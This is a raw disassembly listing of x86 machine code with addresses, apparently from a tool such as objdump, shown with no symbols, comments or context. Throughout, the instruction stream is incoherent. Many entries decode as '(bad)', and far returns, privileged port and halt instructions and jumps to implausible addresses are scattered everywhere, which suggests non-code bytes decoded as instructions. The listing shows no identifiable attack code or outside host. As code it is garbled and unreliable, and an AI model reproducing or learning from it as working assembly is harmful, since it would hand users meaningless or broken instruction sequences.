  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
  430da3:	leave  
  430da4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430da8:	add    BYTE PTR [ecx+0x0],dl
  430dab:	inc    ebp
  430dac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430db2:	add    BYTE PTR [eax-0x7fbf448],bh
  430db8:	add    al,0x2
  430dba:	jmp    0x57eb914
  430dbf:	jne    0x430da9
  430dc1:	mov    eax,DWORD PTR [edx]
  430dc3:	or     BYTE PTR [eax],al
  430dc5:	inc    ecx
  430dc6:	stc    
  430dc7:	in     eax,dx
  430dc8:	ss inc eax
  430dca:	aas    
  430dcb:	out    0x7d,eax
  430dcd:	inc    ecx
  430dce:	mov    ebp,ecx
  430dd0:	lock ret 0x7d
  430dd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430dda:	add    bh,bh
  430ddc:	aad    0xd7
  430dde:	add    dh,cl
  430de0:	clts   
  430de2:	(bad)  
  430de3:	call   0xffce0ce8
  430de8:	hlt    
  430de9:	iret   
  430dea:	jge    0x430dc2
  430dec:	rol    DWORD PTR [esi-0x80],cl
  430def:	jmp    0x1c5cfc
  430df4:	out    dx,al
  430df5:	mov    eax,DWORD PTR [ebx]
  430df7:	(bad)  
  430df8:	pop    esi
  430df9:	push   es
  430dfa:	cmp    al,0xe8
  430dfc:	sar    edi,0x8
  430dff:	inc    DWORD PTR [edi]
  430e01:	inc    esi
  430e02:	(bad)  
  430e03:	loopne 0x430e83
  430e05:	push   edi
  430e06:	push   cs
  430e07:	push   ebx
  430e08:	add    BYTE PTR [ebx+0x24008b56],cl
  430e0e:	add    BYTE PTR [ebp+0x50],al
  430e11:	push   eax
  430e12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e18:	sub    edx,DWORD PTR [esi-0x24]
  430e1b:	jne    0x430dd3
  430e1d:	lods   eax,DWORD PTR ds:[esi]
  430e1e:	mov    edx,DWORD PTR [edx-0x34]
  430e21:	dec    esi
  430e22:	out    0x83,eax
  430e24:	into   
  430e25:	push   edi
  430e27:	loopne 0x430df7
  430e29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e34:	rol    DWORD PTR [edx],0x8
  430e37:	mov    esp,ecx
  430e39:	cmp    DWORD PTR [ebx],0xc
  430e3c:	mov    esi,0x5001c0
  430e41:	push   eax
  430e42:	push   cs
  430e43:	push   eax
  430e44:	(bad)  
  430e45:	sub    edx,edi
  430e47:	push   esi
  430e48:	adc    al,0xcb
  430e4a:	ins    DWORD PTR es:[edi],dx
  430e4b:	mov    eax,0x203e8
  430e50:	add    al,ah
  430e52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e59:	add    dh,al
  430e5b:	add    ah,ch
  430e5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e63:	pop    ecx
  430e64:	or     eax,ebx
  430e66:	cli    
  430e67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e6d:	lea    ebp,[ebx]
  430e6f:	mov    edx,DWORD PTR [edx-0x4]
  430e72:	dec    ecx
  430e73:	inc    ebp
  430e74:	shr    BYTE PTR [ebx],0x4b
  430e77:	and    al,0x0
  430e79:	(bad)  
  430e7a:	jne    0x430ec1
  430e7c:	pop    eax
  430e7d:	mov    al,0x5a
  430e7f:	call   0x14210de
  430e84:	and    al,0x85
  430e86:	push   edx
  430e87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e8b:	dec    ebp
  430e8c:	mov    cl,0x23
  430e8e:	jmp    0x430e7c
  430e90:	mov    al,0xe7
  430e92:	call   0x1391180
  430e97:	shr    DWORD PTR [eax+ebx*2],cl
  430e9a:	lock (bad) 
  430e9c:	adc    eax,0x757f008d
  430ea1:	out    0x58,eax
  430ea3:	cmp    al,0x7
  430ea5:	pop    edx
  430ea6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ead:	push   ecx
  430eae:	cld    
  430eaf:	mov    esi,0x3b0175
  430eb4:	and    al,0xb0
  430eb6:	xor    BYTE PTR [edx+0x1],0x8b
  430eba:	add    ah,bh
  430ebc:	mov    edi,DWORD PTR [ebp-0x4]
  430ebf:	psubsw mm7,QWORD PTR [edi]
  430ec2:	add    DWORD PTR [ebp+0x0],ebp
  430ec5:	rcr    eax,1
  430ec7:	mov    edi,ecx
  430ec9:	and    eax,DWORD PTR [eax]
  430ecb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ed1:	call   0x13011ba
  430ed6:	add    al,cl
  430ed8:	mov    ebp,esi
  430eda:	aam    0x83
  430edc:	or     DWORD PTR [ecx],eax
  430ede:	jne    0x430ed1
  430ee0:	mov    eax,DWORD PTR [eax]
  430ee2:	aam    0x0
  430ee4:	dec    ebp
  430ee5:	jne    0x430e72
  430ee7:	cmp    ebx,eax
  430ee9:	jb     0x430f38
  430eeb:	jmp    0x430e78
  430eed:	mov    ebx,esp
  430eef:	int3   
  430ef0:	dec    ebp
  430ef1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430ef8:	mov    edx,0x8b0a8b
  430efd:	cmp    ecx,DWORD PTR [eax]
  430eff:	jb     0x430ed8
  430f01:	pop    edx
  430f02:	push   edi
  430f03:	cli    
  430f04:	pop    es
  430f05:	mov    eax,ecx
  430f07:	jb     0x430f0b
  430f09:	add    DWORD PTR [ebx],0xa
  430f0c:	mov    eax,DWORD PTR [ebx]
  430f0e:	int3   
  430f0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f15:	jmp    0x430ea2
  430f17:	mov    al,0xe8
  430f19:	call   0x104119b
  430f1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430f21:	pop    edi
  430f22:	or     BYTE PTR [ecx-0x73],bl
  430f25:	pop    ecx
  430f26:	inc    edi
  430f27:	xor    al,0xeb
  430f29:	push   ecx
  430f2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f30:	call   0xb21035
  430f35:	int3   
  430f36:	sbb    BYTE PTR [esi],ch
  430f38:	inc    ebp
  430f39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f3f:	call   0x9c11ae
  430f44:	or     BYTE PTR [ebx-0x73],dl
  430f47:	cmp    al,0x47
  430f49:	mov    al,0x1
  430f4b:	jb     0x430f4d
  430f4d:	mov    al,0x10
  430f4f:	push   eax
  430f50:	add    al,0x75
  430f52:	add    BYTE PTR [ebx],ch
  430f54:	add    ebx,esp
  430f56:	int3   
  430f57:	jne    0x430f69
  430f59:	movsx  edx,cl
  430f5c:	add    DWORD PTR [eax],eax
  430f5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f65:	mov    gs,edi
  430f67:	add    BYTE PTR [eax-0x50],ch
  430f6a:	add    al,ch
  430f6c:	mov    eax,DWORD PTR [ecx]
  430f6e:	sub    eax,DWORD PTR [eax]
  430f70:	jb     0x430fe7
  430f72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f76:	jge    0x430f60
  430f78:	add    al,0x1
  430f7a:	add    DWORD PTR [eax],0x0
  430f7d:	jne    0x430f7f
  430f7f:	je     0x430fc6
  430f81:	mov    eax,DWORD PTR [edi]
  430f83:	ror    BYTE PTR [ebp+0x4d],1
  430f86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430f8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430f93:	mov    DWORD PTR [ebx],ebp
  430f95:	fadd   DWORD PTR [eax+0x75]
  430f98:	inc    eax
  430f99:	pop    eax
  430f9a:	lea    ebx,[ecx+0x4f]
  430f9d:	push   0xb1000003
  430fa2:	out    dx,eax
  430fa3:	add    ebp,DWORD PTR [edx+edx*2]
  430fa6:	add    BYTE PTR [ebx+ecx*4],bh
  430fa9:	mov    ch,BYTE PTR [ebx]
  430fab:	jb     0x43101f
  430fad:	add    al,0x89
  430faf:	push   eax
  430fb0:	call   0x842b5d22
  430fb5:	add    DWORD PTR [eax+eax*1],eax
  430fb8:	jae    0x430fce
  430fba:	icebp  
  430fbb:	inc    ebp
  430fbc:	mov    eax,DWORD PTR gs:[ecx]
  430fbf:	int3   
  430fc0:	out    dx,al
  430fc1:	loopne 0x431010
  430fc3:	sub    eax,DWORD PTR [edx]
  430fc5:	push   0xffffff83
  430fc7:	pop    esi
  430fc8:	push   cs
  430fc9:	jl     0x430fe4
  430fcb:	add    al,0xaf
  430fcd:	xor    eax,0x832b6d00
  430fd2:	mov    eax,DWORD PTR [edx]
  430fd4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430fe0:	inc    ebp
  430fe1:	shr    ebx,0x3
  430fe4:	or     DWORD PTR [eax],0x4
  430fe7:	push   0xffffffa5
  430fe9:	pop    esi
  430fea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ff1:	jmp    0x431050
  430ff3:	mov    edi,0xff0272
  430ff8:	fdivr  QWORD PTR [ebp+0x5d]
  430ffb:	push   0x4e
  430ffd:	pop    ecx
  430ffe:	call   0x435403
  431003:	mov    DWORD PTR [ebx],eax
  431005:	in     al,0xc8
  431007:	rol    BYTE PTR [ebp-0x75],0xc1
  43100b:	call   0xad11ec
  431010:	pop    esi
  431011:	enter  0xceff,0x8b
  431015:	repz mov ecx,DWORD PTR [ebp-0x34]
  431019:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431020:	je     0x431022
  431022:	or     DWORD PTR [ebx-0x74183b24],eax
  431028:	jne    0x43100e
  43102a:	jmp    0x431025
  43102c:	push   DWORD PTR [edx-0x24]
  43102f:	push   0x4d
  431031:	pop    ecx
  431032:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  431036:	jge    0x43103e
  431038:	mov    eax,eax
  43103a:	sub    ebp,DWORD PTR [edx+0x24]
  43103d:	pop    esi
  43103e:	inc    ebp
  43103f:	mov    esp,0x8b6077
  431044:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43104a:	lods   al,BYTE PTR ds:[esi]
  43104b:	add    BYTE PTR [ebx],bh
  43104d:	enter  0xce73,0x49
  431051:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  431059:	stc    
  43105a:	jge    0x4310ce
  43105c:	jnp    0xdd4293cb
  431062:	call   0xc61138
  431067:	fadd   st(0),st
  431069:	dec    esi
  43106a:	ins    BYTE PTR es:[edi],dx
  43106b:	stc    
  43106c:	cmp    al,0x73
  43106e:	push   ebp
  43106f:	mov    eax,0xf8028b
  431074:	jne    0x431037
  431076:	mov    esi,ecx
  431078:	mov    esp,DWORD PTR [ebp+0x2c]
  43107b:	add    edi,DWORD PTR [ebp-0x24]
  43107e:	sub    esp,eax
  431080:	and    al,0x45
  431082:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431088:	sbb    al,0xee
  43108a:	pop    esi
  43108b:	call   0x8310bb
  431090:	fsubr  st,st(3)
  431092:	sti    
  431093:	add    BYTE PTR gs:[ecx],bh
  431096:	add    eax,esp
  431098:	add    DWORD PTR [esi],eax
  43109a:	rol    DWORD PTR [ebp+0x8],0x29
  43109e:	mov    esp,eax
  4310a0:	clc    
  4310a1:	jne    0x431118
  4310a3:	mov    eax,0x8b0673
  4310a8:	loopne 0x4310ef
  4310aa:	loopne 0x431035
  4310ac:	lods   al,BYTE PTR ds:[esi]
  4310ad:	int3   
  4310ae:	inc    ebp
  4310af:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310b3:	add    al,0xc3
  4310b5:	sub    ecx,DWORD PTR [ebp+0x47]
  4310b8:	(bad)  
  4310ba:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310be:	add    eax,DWORD PTR [eax]
  4310c0:	call   0x644d1c5
  4310c5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310cb:	dec    esi
  4310cc:	ins    DWORD PTR es:[edi],dx
  4310cd:	in     al,dx
  4310ce:	lea    eax,[eax]
  4310d0:	inc    ebp
  4310d1:	inc    ebp
  4310d2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310d8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310e2:	and    al,0xdc
  4310e4:	ror    DWORD PTR [edx+0x24],0xf7
  4310e8:	or     BYTE PTR [ebp+0x4c],dh
  4310eb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4310ef:	stos   BYTE PTR es:[edi],al
  4310f0:	adc    edx,edi
  4310f2:	inc    esp
  4310f3:	add    edi,DWORD PTR [eax]
  4310f5:	jne    0x4310da
  4310f7:	mov    DWORD PTR [eax-0x7449db04],ecx
  4310fd:	cmp    ecx,DWORD PTR [edi]
  4310ff:	sub    BYTE PTR [ebp-0x7e],dl
  431102:	sar    ebp,0xb
  431105:	jmp    FWORD PTR [edi+0x2400392a]
  43110b:	sub    esi,DWORD PTR [ebx-0x73]
  43110e:	mov    esp,DWORD PTR [ecx+edi*4]
  431111:	mov    ecx,DWORD PTR [eax]
  431113:	and    BYTE PTR [eax],al
  431115:	jne    0x4310e1
  431117:	sub    ebp,ecx
  431119:	sbb    BYTE PTR [esi+0x32],ah
  43111c:	dec    ebp
  43111d:	push   ebp
  43111e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431124:	ret    
  431125:	mov    edx,ebp
  431127:	leave  
  431128:	sub    DWORD PTR [esi+0x24],ebx
  43112b:	ret    0x2b
  43112e:	pop    ax
  431130:	push   ebp
  431131:	rol    BYTE PTR [ebx],0xeb
  431134:	add    DWORD PTR [ecx+0x6c0001],0x40
  43113b:	jb     0x431192
  43113d:	ret    
  43113e:	in     al,dx
  43113f:	jecxz  0x4310cc
  431141:	push   esi
  431142:	xchg   esp,eax
  431143:	jne    0x431145
  431145:	cmp    edx,DWORD PTR [esi+0x1c]
  431148:	jne    0x43112e
  43114a:	mov    eax,DWORD PTR [ebp-0x77]
  43114d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431154:	mov    esi,DWORD PTR [ebp-0x75]
  431157:	pop    esi
  431158:	nop
  431159:	mov    eax,DWORD PTR [eax]
  43115b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431161:	add    al,0x0
  431163:	inc    ebp
  431164:	mov    eax,DWORD PTR [ebx]
  431166:	mov    ebp,ebx
  431168:	cmp    al,0xf
  43116a:	or     al,al
  43116c:	inc    ebp
  43116d:	inc    ebp
  43116e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431174:	cld    
